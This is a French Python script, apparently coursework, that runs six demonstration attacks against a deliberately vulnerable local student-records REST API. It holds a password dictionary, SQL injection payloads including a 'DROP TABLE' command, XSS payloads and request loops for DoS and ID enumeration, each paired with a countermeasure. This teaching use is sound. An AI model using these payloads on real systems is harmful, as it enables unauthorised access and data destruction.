"""
Démonstration d'attaques de sécurité sur API REST
UNIQUEMENT À DES FINS ÉDUCATIVES
"""
import requests
from requests.auth import HTTPBasicAuth
import json
import time


class AttaquesREST:
    """Démonstrations d'attaques sur l'API REST"""

    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url

    def attaque_brute_force(self):
        """
        ATTAQUE 1: Brute Force sur l'authentification
        Tentative de deviner le mot de passe par force brute
        """
        print("\n" + "=" * 60)
        print("ATTAQUE 1: BRUTE FORCE - Authentification")
        print("=" * 60)
        print("Description: Tentative de deviner le mot de passe")

        username = "admin"
        passwords = ["123456", "password", "admin", "password123", "qwerty"]

        print(f"\nCible: {username}")
        print(f"Dictionnaire: {len(passwords)} mots de passe")

        for password in passwords:
            try:
                response = requests.post(
                    f"{self.base_url}/api/etudiants",
                    json={"id": 999, "nom": "Test", "prenom": "Test", "filiere": "Test"},
                    auth=HTTPBasicAuth(username, password),
                    timeout=2
                )

                if response.status_code == 201:
                    print(f"✓ SUCCÈS! Mot de passe trouvé: {password}")
                    return
                else:
                    print(f"✗ Échec: {password}")

            except requests.exceptions.RequestException as e:
                print(f"✗ Erreur: {password} - {e}")

            time.sleep(0.5)  # Délai pour éviter de surcharger

        print("\n⚠ Contremesure recommandée: Limitation du taux de tentatives")

    def attaque_injection_sql(self):
        """
        ATTAQUE 2: Injection SQL (simulée)
        Exploitation d'un endpoint vulnérable
        """
        print("\n" + "=" * 60)
        print("ATTAQUE 2: INJECTION SQL (Simulée)")
        print("=" * 60)
        print("Description: Exploitation d'une vulnérabilité d'injection SQL")

        payloads = [
            "1' OR '1'='1",
            "1'; DROP TABLE etudiants; --",
            "1' UNION SELECT * FROM users --"
        ]

        for payload in payloads:
            print(f"\nPayload: {payload}")
            try:
                response = requests.post(
                    f"{self.base_url}/api/debug/sql",
                    json={"query": payload},
                    timeout=2
                )
                print(f"Réponse: {response.json()}")
            except Exception as e:
                print(f"Erreur: {e}")

        print("\n⚠ Contremesure recommandée: Utiliser des requêtes préparées")

    def attaque_xss(self):
        """
        ATTAQUE 3: Cross-Site Scripting (XSS)
        Injection de code JavaScript malveillant
        """
        print("\n" + "=" * 60)
        print("ATTAQUE 3: CROSS-SITE SCRIPTING (XSS)")
        print("=" * 60)
        print("Description: Injection de code JavaScript malveillant")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload=alert('XSS')>"
        ]

        for payload in payloads:
            print(f"\nPayload: {payload}")
            try:
                response = requests.post(
                    f"{self.base_url}/api/debug/xss",
                    json={"input": payload},
                    timeout=2
                )
                print(f"Réponse: {response.json()}")
            except Exception as e:
                print(f"Erreur: {e}")

        print("\n⚠ Contremesure recommandée: Échapper tout contenu utilisateur")

    def attaque_dos(self):
        """
        ATTAQUE 4: Déni de Service (DoS)
        Surcharge du serveur avec de nombreuses requêtes
        """
        print("\n" + "=" * 60)
        print("ATTAQUE 4: DÉNI DE SERVICE (DoS)")
        print("=" * 60)
        print("Description: Surcharge du serveur avec de nombreuses requêtes")
        print("⚠ VERSION ATTÉNUÉE POUR DÉMONSTRATION")

        nb_requests = 10  # Réduit pour la démonstration
        print(f"\nEnvoi de {nb_requests} requêtes simultanées...")

        success = 0
        failed = 0

        for i in range(nb_requests):
            try:
                response = requests.get(
                    f"{self.base_url}/api/etudiants",
                    timeout=1
                )
                if response.status_code == 200:
                    success += 1
                else:
                    failed += 1
            except:
                failed += 1

        print(f"Résultat: {success} succès, {failed} échecs")
        print("\n⚠ Contremesure recommandée: Rate limiting et CAPTCHA")

    def attaque_idor(self):
        """
        ATTAQUE 5: IDOR (Insecure Direct Object Reference)
        Accès non autorisé à des ressources en modifiant les IDs
        """
        print("\n" + "=" * 60)
        print("ATTAQUE 5: IDOR - Insecure Direct Object Reference")
        print("=" * 60)
        print("Description: Énumération et accès aux ressources via IDs")

        print("\nÉnumération des étudiants (IDs 1-5):")
        for id in range(1, 6):
            try:
                response = requests.get(
                    f"{self.base_url}/api/etudiants/{id}",
                    timeout=2
                )
                if response.status_code == 200:
                    data = response.json()
                    print(f"✓ ID {id}: {data.get('nom')} {data.get('prenom')}")
                else:
                    print(f"✗ ID {id}: Non trouvé")
            except Exception as e:
                print(f"✗ ID {id}: Erreur - {e}")

        print("\n⚠ Contremesure recommandée: UUIDs au lieu d'IDs séquentiels")

    def attaque_absence_https(self):
        """
        ATTAQUE 6: Absence de HTTPS
        Interception de données en clair
        """
        print("\n" + "=" * 60)
        print("ATTAQUE 6: ABSENCE DE HTTPS")
        print("=" * 60)
        print("Description: Les données sont transmises en clair")

        print("\nSimulation d'une capture de trafic:")
        print("Username: admin")
        print("Password: password123")
        print("⚠ Ces informations peuvent être interceptées!")

        print("\n⚠ Contremesure recommandée: Utiliser HTTPS obligatoirement")


def demo_attaques():
    """Exécuter toutes les démonstrations d'attaques"""
    print("\n" + "🔴" * 30)
    print("DÉMONSTRATION D'ATTAQUES DE SÉCURITÉ")
    print("UNIQUEMENT À DES FINS ÉDUCATIVES")
    print("🔴" * 30)

    attaques = AttaquesREST()

    try:
        # Test de connexion
        response = requests.get("http://localhost:5000", timeout=2)
        if response.status_code != 200:
            raise Exception("Serveur non accessible")
    except:
        print("\n❌ ERREUR: Le serveur REST n'est pas accessible")
        print("Veuillez démarrer le serveur avec: python rest/api_rest.py")
        return

    # Exécuter les attaques
    attaques.attaque_brute_force()
    attaques.attaque_injection_sql()
    attaques.attaque_xss()
    attaques.attaque_dos()
    attaques.attaque_idor()
    attaques.attaque_absence_https()

    print("\n" + "=" * 60)
    print("RÉSUMÉ DES VULNÉRABILITÉS DÉTECTÉES")
    print("=" * 60)
    print("1. ✗ Authentification faible (brute force possible)")
    print("2. ✗ Injection SQL (validation insuffisante)")
    print("3. ✗ XSS (pas d'échappement)")
    print("4. ✗ Absence de rate limiting (DoS possible)")
    print("5. ✗ IDOR (IDs prévisibles)")
    print("6. ✗ Absence de HTTPS (données en clair)")
    print("\n⚠ CES VULNÉRABILITÉS SONT INTENTIONNELLES POUR LA DÉMONSTRATION")
    print("=" * 60)


if __name__ == "__main__":
    demo_attaques()